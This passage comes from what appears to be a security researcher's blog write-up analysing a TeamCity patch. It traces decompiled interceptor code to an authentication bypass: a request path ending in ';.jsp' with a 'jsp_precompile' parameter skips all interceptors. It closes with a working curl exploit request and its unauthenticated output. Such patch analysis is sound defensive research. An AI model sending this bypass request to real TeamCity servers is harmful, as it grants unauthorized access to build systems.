	The `if (includeRequestUri != null || request.getAttribute("javax.servlet.forward.request_uri") != null)` block checks whether either the include or forward attribute is present. If either is present, it implies the request is either an included or a forwarded request, and the code returns true, meaning interceptor doesn't need to run.

4. It then checks the path of the given request, if it starts with `/app/agents/` or `/update`, then the code returns immediately.

5. The patch has a set of whitelisted controllers on which this interceptor is not required to run. From the name of the controllers, for example, `LoginController` or `ForgotPasswordController`, we can assume that these controllers handle pre-authenticated endpoints which means no need to run the Interceptor.

6. Finally the intercept function calls `checkAuthenticationRequirement`, let's look at what this does. From the flow of the code, this looks to be the core function where the logic exists.

{% highlight java lineos %}
    private static boolean checkAuthenticationRequirement(Object handler, String path) {
        /**
         * in short this is whats happening
         * AuthorizationInterceptorImpl.myAuthorizationPaths.isAuthenticationRequired(path)
         * 
         */

        Object authorizationPaths;
        try {
            Field authorizationPathsField = handler.getClass().getDeclaredField("myAuthorizationPaths");
            authorizationPathsField.setAccessible(true);
            authorizationPaths = authorizationPathsField.get(handler);
        } catch (NoSuchFieldException | IllegalAccessException e) {
            try {
                Method isAuthenticationRequiredMethod = handler.getClass().getDeclaredMethod("isAuthenticationRequired", String.class);
                isAuthenticationRequiredMethod.setAccessible(true);
                return (Boolean) isAuthenticationRequiredMethod.invoke(handler, path); // 
            } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException ex) {
                return true;
            }
        }
        try {
            Method isAuthenticationRequiredMethod = authorizationPaths.getClass().getDeclaredMethod("isAuthenticationRequired", String.class);
            return (Boolean) isAuthenticationRequiredMethod.invoke(authorizationPaths, path);
        } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
            return true;
        }
    }
{%endhighlight%}

7. The function starts by reading `myAuthorizationPaths` from `AuthorizationInterceptorImpl` class which contains the list of paths. 

8. Further down the code, using reflection, it reads the function `isAuthenticationRequired` and explicitly invoking this function on the given paths.

This doesn't make sense, why would the patch add a new interceptor which explicitly invokes an already inbuilt function used for checking if authentication is required or not ?

## Authentication Bypass

A logical explanation could be that, in the newly added interceptor, there was a lot of "if else" conditions where authentication is explicitly bypassed. What if, in the original code, there exists a condition where the auth checks are explicity bypassed ?

Let's explore the interceptors defined in detail to understand this. Grepping for the `AuthorizationInterceptor`, we can see the full path of the file: `jetbrains/buildServer/controllers/interceptors/AuthorizationInterceptorImpl.java`. Seems like all the interceptors are defined inside the folder `jetbrains/buildServer/controllers/interceptors/`

Exploring through `AuthorizationInterceptorImpl.java`, even through the Interceptor has a lot of logic inside, it's getting invoked somewhere else. Exploring further in the same directory, we can see another very interesting file named `RequestInterceptors.java` where interceptors are explicity getting added and invoked. We can confirm this by setting a breakpoint at the `preHandle` function:

 <div align='center'><img src="/images/2024/teamcity/prehandler_breakpoint.png" alt="Breaking at preHandle() to dump memory" height="450"/></div>

 Let's explore this `preHandle` function in detail:

{% highlight java lineos %}
   public final boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
      if (!this.requestPreHandlingAllowed(request)) {
         return true;
      } else {
         Stack reqStack = this.requestIn(request);
         if (reqStack.size() >= 70 && request.getAttribute("__tc_requestStack_overflow") == null) {
            LOG.warn("Possible infinite recursion of page includes. Request: " + WebUtil.getRequestDump(request));
            request.setAttribute("__tc_requestStack_overflow", this);
            Throwable o = (new ServletException("Too much recurrent forward or include operations")).fillInStackTrace();
            request.setAttribute("javax.servlet.jsp.jspException", o);
            RequestDispatcher dispatcher = request.getRequestDispatcher("/runtimeError.jsp");
            if (dispatcher != null) {
               dispatcher.include(request, response);
            }

            return false;
         } else {
            if (reqStack.size() == 1) {
               Iterator var5 = this.myInterceptors.iterator();

               while(var5.hasNext()) {
                  HandlerInterceptor i = (HandlerInterceptor)var5.next();
                  if (!i.preHandle(request, response, handler)) {
                     return false;
                  }
               }
            }
{%endhighlight%}

1. The `requestPreHandlingAllowed(request)` method checks if the pre-handling operations are permitted for this request. If not, the method returns true, allowing the request to proceed without additional processing.

2. `Stack reqStack = this.requestIn(request)`: Retrieves a stack representing some state related to the request, likely tracking recursion.

3. If `reqStack.size() >= 70`, it's an indication that too many recursive operations (forwards or includes) have occurred, suggesting an infinite loop.

4. If recursion is detected, a warning is logged, and a `ServletException` is thrown with a message about "Too much recurrent forward or include operations."

5. `If reqStack.size() == 1`, indicating this is the first request in a potential stack of recursive operations, the code iterates over myInterceptors.

6. For each `HandlerInterceptor` in `myInterceptors`, it calls preHandle on the current request, response, and handler. If any of these interceptors return false, indicating they do not allow the request to proceed, the method returns false.

Now it's clear for us that `RequestInterceptors.java` has a `prehandle()` which internally invokes all other interceptors one by one. Let's explore the `requestPreHandlingAllowed(request)` function in detail since this method checks if the pre-handling operations are permitted for a given request. If there is a way in which can make the function `requestPreHandlingAllowed(request)` return "true" then none of the interceptors are run, that includes the `AuthorizationInterceptorImpl.java`.

**File**: *TeamCity/fern/jetbrains/buildServer/controllers/interceptors/RequestInterceptors.java*
{% highlight java lineos %}
158:    private boolean requestPreHandlingAllowed(@NotNull HttpServletRequest request) {
159:       if (WebUtil.isJspPrecompilationRequest(request)) {
160:          return false;
161:       } else {
162:          return !this.myPreHandlingDisabled.matches(WebUtil.getPathWithoutContext(request));
163:       }
164:    }
{%endhighlight%}

So `requestPreHandlingAllowed` internally calls `WebUtil.isJspPrecompilationRequest`, which from the look of it, checks if the request is a precompiled JSP. Let's explore the function in detail:

**File**: *TeamCity/fern/jetbrains/buildServer/web/util/WebUtil.java*
{% highlight java lineos %}
1649:   public static boolean isJspPrecompilationRequest(@NotNull final HttpServletRequest request) {
1650:     final String uri = StringUtil.notNullize(request.getRequestURI());
1651:     return (uri.endsWith(".jsp") || uri.endsWith(".jspf")) && request.getParameter("jsp_precompile") != null;
1652:   }
{%endhighlight%}

The method reads request path through `getRequestURI()` to check if it ends with ".jsp" or ".jspf" and also checks if the request contains a GET parameter named `jsp_precompile`, if so, the function returns true, essentially leading to the original if condition returning true, skipping the entire else part where interceptors are invoked.

Tomcat supports the use of `;` which is considered a parameter of the path itself. Ex: *<u>https://example.com/rest/abc;a=b?param=123</u>*. Here `;a=b` is considered a parameter for the path itself ! We can abuse the functionality here since the `WebUtil.isJspPrecompilationRequest` reads the requestURI directly and runs `endsWith()` to determine if it's a pre-compiled request.

## Exploit

So we can try and hit an endpoint which requires authentication but we can pass `;.jsp` at the end along with adding a GET parameter `jsp_precompile=1` should bypass the authentication and give us the results.

{% highlight bash lineos %}
a0xnirudh@X1 ~/Downloads/teamcity $ curl http://localhost:8111/app/rest/projects;.jsp?jsp_precompile=1

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><projects count="2" href="/app/rest/projects;.jsp?jsp_precompile=1"><project id="_Root" name="&lt;Root project&gt;" description="Contains all other projects" href="/app/rest/projects/id:_Root" webUrl="http://localhost:8111/project.html?projectId=_Root"/><project id="Test" name="test" parentProjectId="_Root" href="/app/rest/projects/id:Test" webUrl="http://localhost:8111/project.html?projectId=Test"/></projects>%
{%endhighlight%}
